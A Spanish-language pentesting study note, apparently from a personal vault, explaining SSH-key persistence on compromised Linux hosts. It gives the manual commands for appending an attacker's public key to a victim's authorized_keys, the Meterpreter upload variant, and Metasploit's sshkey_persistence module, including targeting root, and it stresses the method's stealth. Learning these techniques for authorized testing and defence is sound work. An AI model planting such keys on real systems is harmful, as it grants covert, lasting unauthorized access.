# 🔑 Persistencia en Linux: Par de Claves SSH
La persistencia vía SSH consiste en añadir nuestra clave pública al archivo `authorized_keys` del usuario víctima. Esto nos permite loguearnos por SSH sin que el sistema nos pida la contraseña del usuario.

## 🎯 Requisitos Previos

1. Tener una shell en la máquina víctima (puede ser una shell normal o Meterpreter).
2. Que el servicio SSH esté corriendo en la víctima (`systemctl status ssh` o ver puerto 22 abierto).
3. Tener una carpeta `.ssh` en el directorio _home_ del usuario víctima.

## 🚀 Paso 1: Generar el par de claves en Kali
Si aún no tienes un par de llaves, créalas en tu máquina de atacante (Kali):
- `ssh-keygen -t rsa -b 4096`
	- Puedes usar tambien:
	- `-f <nombre>`: Darle un nombre especifico a la clave
	- `-C "<comentario>"`: Escribir un comentario en la clave
- Pulsa **Enter** para guardar en la ruta por defecto (`/home/kali/.ssh/id_rsa`).
- **Passphrase:** Puedes dejarlo en blanco para entrar más rápido, o poner una clave para mayor seguridad.

Esto generará dos archivos:

- `id_rsa`: Tu **llave privada** (¡NUNCA la compartas!).
- `id_rsa.pub`: Tu **llave pública** (Esta es la que subiremos a la víctima).

## 🛰️ Paso 2: Transferir la llave pública a la víctima
Debes copiar el contenido de tu `id_rsa.pub` y pegarlo en el archivo `~/.ssh/authorized_keys` de la víctima.

### A. Si tienes una shell (Manual):

1. En **Kali**, muestra tu llave pública: `cat ~/.ssh/id_rsa.pub` (Copia el texto que empieza por `ssh-rsa...`).
2. En la **Víctima**, prepara el terreno:
	- `mkdir -p ~/.ssh` 
	- `chmod 700 ~/.ssh` 
	- `echo "<PEGAR_AQUI_TU_LLAVE_COPIADA>" >> ~/.ssh/authorized_keys` 
	- `chmod 600 ~/.ssh/authorized_keys`
### B. Usando Meterpreter:
Si tienes una sesión de Meterpreter, puedes usar el comando `upload`:
- `meterpreter > mkdir /home/<usuario>/.ssh`
- `meterpreter > upload /home/kali/.ssh/id_rsa.pub /home/<usuario>/.ssh/authorized_keys`

## 🔓 Paso 3: Conexión persistente
Ahora, desde tu Kali, intenta conectar. No debe de pedir contraseña.
- `ssh -i id_rsa <usuario>@<IP_VICTIMA>`

## 🚀Mediante [[Metasploit]]
Si ya tienes una sesión de **Meterpreter** (o una shell normal dentro de MSF), puedes usar este módulo de post-explotación para inyectar una llave SSH de forma automática.

- **Módulo:** `post/linux/manage/sshkey_persistence`
- **Función:** Genera un par de claves SSH (o usa las tuyas), crea el directorio `.ssh` en la víctima si no existe, ajusta los permisos y añade la clave a `authorized_keys`.
### 🛠️ Configuración y Ejecución
Desde la consola de Metasploit (`msfconsole`):
- `use post/linux/manage/sshkey_persistence`
- `set SESSION <ID_DE_TU_SESION>`
- `run o exploit`
Opciones interesantes:
- `set USERNAME root` # Por defecto intenta el usuario de la sesión actual
- `# set CREATESSOTRUE` # Crea el directorio .ssh si no existe

### 🗝️ ¿Qué ocurre tras la ejecución?

1. **Generación de llaves:** Metasploit generará una llave privada y una pública.
2. **Almacenamiento:** La llave privada se guardará en tu máquina local (Kali) en la base de datos de Metasploit o en una ruta temporal que el módulo te indicará en pantalla (ej: `/home/kali/.msf4/loot/...`).

![[Imagenes/ClavePrivadaMetasploit.png]]

3. **Inyección:** La llave pública se añade automáticamente al archivo `~/.ssh/authorized_keys` de la víctima/s.
### 🔓 Cómo conectar después
Una vez que el módulo termina con éxito, debes usar la llave privada que Metasploit guardó para ti:
Dale permisos correctos a la llave privada descargada 
- `chmod 600 /ruta/de/la/llave_privada_generada` 
Conecta por SSH usando la llave (-i) 
- `ssh -i /ruta/de/la/llave_privada_generada <usuario>@<IP_VICTIMA>`
### 💡 Ventajas de usar este módulo

- **Rapidez:** Ahorras todos los comandos manuales de creación de carpetas y ajuste de permisos (`chmod`).
- **Precisión:** El módulo está programado para poner los permisos exactos que SSH requiere (700 para la carpeta, 600 para el archivo), evitando errores comunes.
- **Persistencia Multiusuario:** Puedes ejecutarlo para diferentes usuarios si tienes los privilegios necesarios, asegurando múltiples vías de entrada.

## 💡 Tips de Seguridad y Configuración

- **Permisos Críticos:** SSH es muy estricto. Si los permisos de la carpeta `.ssh` (700) o del archivo `authorized_keys` (600) son demasiado abiertos, **SSH rechazará la llave** y te pedirá contraseña.
- **¿Y si no hay carpeta .ssh?:** Si el usuario nunca ha usado SSH, la carpeta no existirá. Créala siempre con `mkdir -p ~/.ssh`.
- **Sigilo:** Este método es excelente porque no requiere crear usuarios nuevos ni subir binarios sospechosos (backdoors), simplemente usa una función legítima del sistema.

#
---
**Navegación**:
- Volver a: [[Persistencia en Linux]]